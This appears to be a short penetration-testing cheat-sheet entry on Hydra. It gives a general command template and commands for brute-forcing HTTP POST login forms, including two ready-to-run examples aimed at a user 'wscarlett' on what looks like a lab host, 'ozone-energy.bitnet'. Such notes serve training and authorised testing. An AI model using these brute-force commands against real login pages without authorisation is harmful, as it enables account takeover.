#### Command Usage
```
hydra -L <user_list> -P <password_list> <target> <service>
```

#### HTTP Form
```
hydra -L users.txt -P passwords.txt IP http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
```

- `/login.php`: The login page URL where the request will be sent.
- `Invalid`: Login failure, hydra looks for this in the response to determine whether the login attempt was successful.

```
hydra -l wscarlett -P /usr/share/wordlists/custom/ozone-wordlist.txt ozone-energy.bitnet http-form-post "/[LOGINPAGE]:username=^USER^&password=^PASS^&Login=Login:Invalid Password"

or 

hydra -l wscarlett -P /usr/share/wordlists/custom/ozone-wordlist.txt ozone-energy.bitnet http-form-post "/[LOGINPAGE]:username=^USER^&password=^PASS^&Login=Login:Invalid"
```

- `http-post-form`: It is used to brute-force HTTP POST login forms
- `[LOGINPAGE]`: replace this placeholder with the actual login page name (e.g. admin-login)
